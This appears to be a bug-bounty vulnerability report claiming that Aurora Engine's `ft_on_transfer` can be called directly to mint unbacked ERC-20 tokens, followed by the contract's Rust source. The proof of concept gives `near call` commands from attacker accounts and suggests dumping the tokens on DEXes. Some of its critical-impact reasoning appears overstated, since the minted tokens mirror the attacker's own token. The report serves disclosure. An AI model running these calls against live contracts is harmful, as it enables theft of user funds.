### Title
Unbacked ERC-20 Token Minting via Direct `ft_on_transfer` Call Without NEP-141 Transfer - (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

Any NEAR account can call `ft_on_transfer` directly on the Aurora Engine contract and mint ERC-20 tokens without ever transferring the corresponding NEP-141 tokens. Because `deploy_erc20_token` is permissionless, an attacker can register their own NEAR account as a NEP-141 token, then invoke `ft_on_transfer` directly from that account with an arbitrary `amount`, causing Aurora to mint unbacked ERC-20 tokens. This is a connector/bridge accounting bug: the ERC-20 supply on Aurora becomes unbacked by real NEP-141 assets, enabling the attacker to sell the phantom tokens on Aurora DEXes or use them as collateral in lending protocols to steal real user funds.

---

### Impact Explanation

**Critical — Insolvency / Direct theft of user funds.**

The attacker mints ERC-20 tokens on Aurora that have no NEP-141 backing held by the Aurora contract. These phantom tokens can be:

- Deposited into any Aurora DEX pool (e.g., Uniswap v3 fork) paired against real assets (ETH, USDC ERC-20 mirrors). Other users who swap real assets for the attacker's token receive worthless tokens; the attacker walks away with the real assets.
- Used as collateral in any Aurora lending protocol that accepts arbitrary ERC-20 tokens, allowing the attacker to borrow real assets against zero-cost collateral.

The ERC-20 token supply for the attacker's registered NEP-141 permanently exceeds the actual NEP-141 balance held by Aurora, creating an insolvency condition: legitimate holders of that ERC-20 who attempt to bridge back to NEAR will find insufficient NEP-141 reserves.

---

### Likelihood Explanation

**High.** The attack requires only:
1. A funded NEAR account (trivially obtained).
2. One call to `deploy_erc20_token` to register the attacker's account as a NEP-141 token (permissionless, no deposit required beyond gas).
3. One direct call to `ft_on_transfer` from that account with an arbitrary `amount`.

No special privileges, no leaked keys, no governance capture. The entire attack is executable by any NEAR user in two transactions.

---

### Recommendation

1. **Restrict `ft_on_transfer` to the NEP-141 `ft_transfer_call` callback context.** The NEAR NEP-141 standard guarantees that `ft_on_transfer` is called by the token contract only after it has already escrowed the tokens. Aurora should enforce this by requiring that `ft_on_transfer` is only reachable as a callback (i.e., via `env.assert_private_call()` or by verifying the call originates from a promise created by a prior `ft_transfer_call`).

2. **Alternatively, whitelist permitted NEP-141 token accounts.** Maintain an owner-controlled allowlist of NEP-141 accounts that are permitted to trigger minting via `ft_on_transfer`. Reject calls from unrecognized predecessors.

3. **Add access control to `deploy_erc20_token`.** Require owner or governance approval before a new NEP-141 → ERC-20 mapping is registered, preventing arbitrary accounts from self-registering as mintable token sources.

### Proof of Concept

```
# Attacker controls attacker-token.near

# Step 1: Register attacker-token.near as a NEP-141 on Aurora (permissionless)
near call aurora.near deploy_erc20_token \
  '{"nep141": "attacker-token.near"}' \
  --accountId attacker.near

# Step 2: Call ft_on_transfer directly from attacker-token.near
# No ft_transfer_call was ever made; no NEP-141 tokens were escrowed.
near call aurora.near ft_on_transfer \
  '{"sender_id": "attacker.near", "amount": "1000000000000000000000000", "msg": "<attacker_evm_address_hex>"}' \
  --accountId attacker-token.near   # ← predecessor_account_id = attacker-token.near

# Result: Aurora calls receive_erc20_tokens with predecessor = attacker-token.near,
# which is registered. Aurora mints 1e24 ERC-20 tokens to attacker's EVM address.
# Zero NEP-141 tokens were ever transferred to Aurora.

# Step 3: Sell phantom ERC-20 tokens on an Aurora DEX for real ETH/USDC.
```

The root cause is the absence of any verification in `ft_on_transfer` that the predecessor actually performed a prior `ft_transfer_call` that escrowed tokens, combined with the permissionless nature of `deploy_erc20_token` that allows any NEAR account to become a recognized minting source. pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

    pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());

        // Return SubmitResult so that it can be accessed in standalone engine.
        // This is used to help with the indexing of bridge transactions.
        Ok(Some(result))
    }
